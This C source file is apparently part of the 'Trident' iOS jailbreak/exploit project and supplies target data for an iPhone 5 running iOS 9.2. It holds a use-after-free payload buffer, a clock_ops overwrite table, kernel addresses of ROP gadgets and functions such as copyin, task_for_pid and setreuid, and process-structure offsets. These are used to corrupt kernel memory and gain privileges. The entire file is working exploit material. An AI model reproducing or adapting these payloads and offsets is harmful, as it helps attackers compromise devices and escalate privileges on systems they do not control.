
//
//  target_iphone_5_2_ios_9_2.c
//  Trident
//
//  Created by Gh0stByte on 14/12/2016.
//  Copyright © 2016 Benjamin Randazzo. All rights reserved.
//

#include "target_iphone_5_2_ios_9_2.h"

static uint8_t clock_ops_overwrite[] = {
    0x69, 0x77, 0x31, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1) 0x317769
    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
    0xad, 0xeb, 0x01, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1) 0x1EBAD
    0xdd, 0xd9, 0xdd, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1) 0xDD9DD
};

static uint8_t uaf_payload_buffer[] = {
    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
    0xdc, 0x33, 0x40, 0x00, // [04] address of clock_ops array in kern memory 0x4033DC
    0x7c, 0xa8, 0x0c, 0x00, // [08] address of _copyin 0xCA87C
    0x00, 0x00, 0x00, 0x00, // [0C] NULL
    0x69, 0x77, 0x31, 0x00, // [10] address of OSSerializer::serialize (+1) 0x317769
    0xde, 0xd9, 0x0d, 0x00, // [14] address of "BX LR" code fragment 0xDD9DE
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0xa1, 0x9e, 0x31, 0x00, // [1C] address of OSSymbol::getMetaClass (+1) 0x319EA1
    0xde, 0xd9, 0x0d, 0x00, // [20] address of "BX LR" code fragment 0xDD9DE
    0xde, 0xd9, 0x0d, 0x00, // [24] address of "BX LR" code fragment 0xDD9DE
};

static uint32_t addresses_pool[] = {
    0x000CA5A8, // WRITE_GADGET // address of "str r1, [r0, #0xc] ; bx lr" 0xCA5A8 OR TRY 0xCA5AC
    0x003f6444, // PMAP 0x3F6444
    0x000BE598, // FLUSH_DCACHE 0xBE598
    0x000CA600, // INVALIDATE_TLB 0xCA600
    0x002FBB8C, // TASKFORPID
    0x002A9E24, // SETREUID or 0x2AA250 or 0x22A94
    0x00317769, // SERIALIZE 0x317769
    0x00455968, // ADDRPERM
};

static uint32_t check_offsets_pool[] = {
    0x14, // PID
    0x3e, // POSIX
    0x1e6, // MAC_PROC
};

void target_iphone_5_2_ios_9_2_init(target_t *t)
{
    t->clock_ops_overwrite = clock_ops_overwrite;
    t->clock_ops_overwrite_size = sizeof(clock_ops_overwrite);
    
    t->uaf_payload_buffer = uaf_payload_buffer;
    t->uaf_payload_buffer_size = sizeof(uaf_payload_buffer);
    
    t->addresses_pool = addresses_pool;
    t->check_offsets_pool = check_offsets_pool;
}
